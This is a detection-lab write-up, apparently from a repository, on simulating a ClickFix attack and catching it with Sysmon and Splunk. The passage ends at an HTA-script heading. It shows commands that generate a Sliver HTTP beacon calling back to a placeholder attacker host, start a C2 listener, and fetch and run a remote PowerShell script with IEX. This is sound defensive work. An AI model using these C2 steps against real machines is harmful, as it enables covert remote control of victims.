## ClickFix Detection Lab – From Execution to Logs
### Overview  
This lab simulates a ClickFix attack chain where clipboard content is staged to trick the user into executing a malicious command through the Windows Run dialog.

The objective was to design a behavior-based detection capable of identifying:  
- Clipboard manipulation
- Run dialog usage (RunMRU modification)
- Suspicious process execution
- Multi-stage attack correlation

All detections were built using Sysmon and validated in Splunk.  

### Lab Architecture
**Victim VM**
- Windows 10 VM
- Sysmon configured with ClipboardChange (Event ID 24)
- Atomic Red Team
- AutoHotkey for realistic interaction simulation

**Attacker**
- Kali Linux
- Sliver for C2 Server

**SIEM**
- Splunk for ingesting logs and detection

### ClickFix Attack Chain (Expected Behavior).
1. Malicious command is copied to the clipboard.
2. Opens Run dialog (`Win + R`).
3. Clipboard content is automatically pasted into the Run dialog.
4. `mshta.exe executes the malicious payload.
5. Attacker gains control over the victim machine.

### Setup
#### :one: **Atomic Red Team**  
  
This tool will be used to simulate controlled MITRE ATT&CK techniques. It offers pre-built tests to validate detection effectiveness.  

**Atomic Red Team Installation**
1. Open PowerShell as Administrator (Right-click PowerShell :arrow_right: *Run as Administrator*).  
2. Install the required modules using the command below:
   ```
   Install-Module -Name invoke-atomicredteam,powershell-yaml -Scope CurrentUser
   ```
   Install all the modules from **PSGallery**
     
   ![Install Atomic Red Team Modules](images/art-modules.png)
     
3. Download the Invoke-AtomicRedTeam library
   ```
   IEX(IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
   ```
     
   ![Install Atomic Red Team Library](images/art-library.png)
     
4. Install Atomic Red Team  
     
   ```
   Install-AtomicRedTeam -getAtomics -Force
   ```
     
   **💡 If you get an execution policy error:**
     
   > PowerShell might block the script. You can temporarily change the execution policy like this:
     
   ```
   Set-ExecutionPolicy RemoteSigned
   ```
     
   Then run the install command again.
     
   ![Install Atomic Red Team](images/art.png)

### Useful Atomic Red Team Commands for Testing  
Here are a few helpful commands when working with Atomic Red Team:
- **ShowDetailsBrief**: Lists the available tests briefly. 
- **ShowDetails**: Displays full test details, including attack commands, required input parameters, and prerequisites.
- **GetPrereqs**: Automatically installs all required prerequisites before running a test.

In the screenshot below, you can see the output of **ShowDetailsBrief**, along with the execution of a simulated ClickFix campaign based on MITRE ATT&CK technique **T1204.002 (User Execution: Malicious File)**.  
  
![Execution and ShowDetailsBrief](images/showdetailsbrief-execution.png)  
  
You can also test using **TestNumbers** like this:  
  
![TestNumbers](images/testnumbers.png)  
  
And here’s what the detailed test info looks like when using **ShowDetails**.  
  
![ShowDetails](images/showdetails.png)  

#### :two: **Sliver**  
  
Sliver is the core tool in this simulation, I couldn't make the attack realistically without it.  
  
:exclamation: **Warning:** Use Sliver only in a controlled, isolated environment, as it is a potentially dangerous tool.  

**Sliver C2 Server Setup**  
1. Run the following command to start the Sliver server: `sliver-server`.
     
   ![Sliver](images/sliver.png)
     
2. Since the payload will be delivered via an HTA file, generate an HTTP beacon to receive the connection from the victim machine:
     
   ```
   generate beacon --http http://<attacker_ip>:<beacon_port> --os windows
   ```
     
   This command generates a Windows payload.
     
   ![Generate Beacon](images/beacon.png)
     
   After generation, rename the output file to `beacon.exe` (or any preferred name), ensuring it has the `.exe` extension so it can be executed on the target system.  
  
3. Start the HTTP listener to accept incoming beacon connections.

   ```
   http --lhost 192.168.199.129 --lport 8081
   ```

   ![Activate Beacon](images/activate-beacon.png)

#### :three: **Custom HTA Script**  
